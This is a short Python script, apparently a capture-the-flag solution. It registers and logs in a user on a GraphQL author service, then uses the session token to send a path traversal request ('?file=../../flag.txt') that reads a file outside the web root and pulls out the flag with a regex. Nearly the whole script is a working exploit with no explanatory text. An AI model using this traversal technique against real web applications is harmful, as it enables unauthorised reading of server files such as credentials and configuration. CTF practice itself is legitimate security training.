from asyncio import subprocess
import json
import os
import requests
import re
import time

url = 'https://authorsonly.onrender.com/v1/graphql.min.js'

# Define the mutation query and variables to add a user
mutation_query = """
mutation AddAuthor($author: addAuthorInput!) {
  addAuthor(author: $author) {
    name
    password
  }
}
"""

mutation_variables = {
    "author": {
        "name": "tster",
        "email": "tster@example.com",
        "password": "123456"
    }
}

# Send the POST request with the mutation query and variables
response = requests.post(
    url,
    json={"query": mutation_query, "variables": mutation_variables},
    headers={'content-type': 'application/json'}
)

time.sleep(2);

graphql_url = 'https://authorsonly.onrender.com/v1/graphql.min.js'

auth_query = """
mutation AuthenticateAuthor($author: authenticateAuthorInput!) {
  authenticateAuthor(author: $author) {
    redirect
    success
    token
  }
}
"""

auth_variables = {
    "author": {
        "email": "tster@example.com",
        "password": "123456"
    }
}

# Send the POST request to authenticate the user and obtain a token
auth_response = requests.post(
    graphql_url,
    json={"query": auth_query, "variables": auth_variables},
    headers={'content-type': 'application/json'}
)

# Check if authentication was successful and retrieve the token
if auth_response.status_code == 200:
    auth_data = auth_response.json().get("data", {}).get("authenticateAuthor", {})
    if auth_data.get("success"):
        token = auth_data.get("token")

      
        home_url = 'https://authorsonly.onrender.com/home?file=../../flag.txt'
        headers = {'Cookie': f'token={token}'}
        home_response = requests.get(home_url, headers=headers)

       
        if home_response.status_code == 200:
            flag_match = re.search(r'HTB\{[^\}]*\}', home_response.text)
            if flag_match:
                #a Regex to search for flag
                flag = flag_match.group()
                print("Flag:", flag)
